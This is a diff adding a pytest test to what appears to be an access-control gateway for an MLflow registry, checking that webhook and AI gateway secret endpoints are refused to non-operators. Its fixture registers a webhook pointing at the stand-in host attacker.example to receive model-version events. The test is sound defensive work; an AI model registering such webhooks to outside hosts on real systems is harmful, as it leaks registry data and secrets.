@@ -131,6 +131,22 @@ def test_a_path_cannot_reach_the_registry_around_its_check(gw):
     assert not any("static-files" in path for _, path, _ in gw.fake.calls), gw.fake.calls
 
 
+def test_webhooks_and_the_ai_gateway_are_for_operators(gw):
+    # A webhook receives every registry event of every model (names, versions, sources, tags), whoever may
+    # see them; the AI gateway keeps provider keys. Neither is governed per model.
+    hook = json.dumps({"name": "h", "url": "https://attacker.example/x",
+                       "events": [{"entity": "model_version", "action": "created"}]}).encode()
+    for method, path, body in (("POST", "api/2.0/mlflow/webhooks", hook), ("GET", "api/2.0/mlflow/webhooks", b""),
+                               ("POST", "api/2.0/mlflow/webhooks/abc/test", b"{}"),
+                               ("GET", "api/3.0/mlflow/gateway/secrets/list", b"")):
+        with pytest.raises(MlError) as e:
+            _handle(gw, method, path, "", body, "application/json" if body else "")
+        assert e.value.status == 403
+    assert gw.fake.calls == []
+    gw.allowed = lambda p, priv, urn: priv == "MANAGE_SYSTEM_OPERATIONS"
+    assert _handle(gw, "GET", "api/2.0/mlflow/webhooks")[0] == 200
+
+
 def test_an_artifact_is_downloaded_not_rendered_on_cairns_origin(gw):
     # Anyone may log an artifact; an HTML one opened from Cairn's origin would run as whoever opened the link.
     from fastapi import FastAPI
